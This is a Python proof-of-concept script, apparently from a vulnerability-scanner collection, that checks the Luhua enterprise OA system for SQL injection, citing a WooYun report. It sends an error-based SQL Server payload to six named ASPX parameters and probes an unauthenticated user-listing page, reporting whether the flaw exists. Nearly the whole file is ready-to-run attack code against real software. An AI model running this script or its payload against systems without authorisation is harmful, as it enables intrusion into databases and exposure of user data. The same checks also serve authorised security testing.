#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华企业版OA系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-065191
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['璐华企业版OA系统多处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "ChAr(71)%2BChAr(81)%2BChAr(88)%2B@@VeRsIoN"
        urls = ["/flow/flow_get_if_value.aspx?template_id=",
                "/include/get_dict.aspx?bt_id=",
                "/LHMail/email_attach_delete.aspx?attach_id=",
                "/OnlineChat/chat_show.aspx?id=",
                "/OnlineChat/chatroom_show.aspx?id=",
                "/OnlineReport/get_condiction.aspx?t_id="]
        try:
            noexist = True
            for turl in urls:
                vulnurl = url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code == 500 and r"GQXMicrosoft" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False

            req = requests.get(url+"/include/get_user.aspx", headers=headers, timeout=10, verify=False)
            if r"button_normal" in req.text:
                result[2]=  '存在'
                result[1]= url+"/include/get_user.aspx"
                noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    